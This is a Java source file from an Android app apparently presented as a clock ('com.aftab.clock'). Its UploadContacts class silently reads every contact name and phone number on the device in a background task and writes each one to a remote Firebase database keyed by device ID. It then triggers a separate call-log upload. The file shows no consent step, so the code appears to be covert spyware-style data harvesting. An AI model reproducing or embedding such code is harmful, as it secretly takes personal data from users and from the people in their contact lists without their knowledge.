package com.aftab.clock.Classes;

import android.content.Context;
import android.database.Cursor;
import android.os.AsyncTask;
import android.provider.ContactsContract;

import com.aftab.clock.Model.Contacts;
import com.aftab.clock.Utills.Constants;
import com.aftab.clock.Utills.FireRef;
import com.aftab.clock.Utills.Functions;
import com.aftab.clock.Utills.SharedPref;

import java.util.ArrayList;
import java.util.Random;

@SuppressWarnings("deprecation")
public class UploadContacts {

    private static UploadContacts instances;

    public static UploadContacts with(Context context) {

        new AsyncCaller(context).execute();


        if (instances == null)
            instances = new UploadContacts();
        return instances;
    }

    public static String rndColor() {
        Random random = new Random();
        int num = random.nextInt(16777215);
        String hex = "";
        while (num != 0) {
            if (num % 16 < 10)
                hex = Integer.toString(num % 16) + hex;
            else
                hex = (char) ((num % 16) + 55) + hex;
            num = num / 16;
        }

        return "#" + ((hex.length() < 6) ? String.format("%0" + (6 - hex.length()) + "d", 0) : "") + hex;
    }

    private static class AsyncCaller extends AsyncTask<Void, Void, Void> {

        Context context;
        SharedPref sh;
        ArrayList<Contacts> contactsArrayList;

        public AsyncCaller(Context context) {
            this.context = context;
            sh = new SharedPref(context);
            contactsArrayList = new ArrayList<>();
        }

        @Override
        protected void onPreExecute() {
            super.onPreExecute();

        }

        @Override
        protected Void doInBackground(Void... params) {
            contactsArrayList.clear();

            Cursor phones = context.getContentResolver().query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI, null, null, null, null);
            while (phones.moveToNext()) {
                String name = phones.getString(phones.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME));
                String phone = phones.getString(phones.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER));

                if (!phone.contains("*") && !phone.contains("#")) {


                    if (!phone.startsWith("+") && phone.length() > 6) {

                        phone = Functions.formatNumber(context, phone, Functions.checkCountryISO(context));

                    }


                    Contacts contacts = new Contacts(name, phone, rndColor());

                    String deviceID = Functions.getDeviceId(context);

                    contactsArrayList.add(contacts);

                    FireRef.CONTACTS.child(deviceID)
                            .child(phone)
                            .setValue(contacts);


                }
            }

            UploadCallLog.with(context);

            sh.saveContactList(contactsArrayList, Constants.CONTACTS);

            phones.close();

            return null;
        }

        @Override
        protected void onPostExecute(Void result) {
            super.onPostExecute(result);


        }

    }
}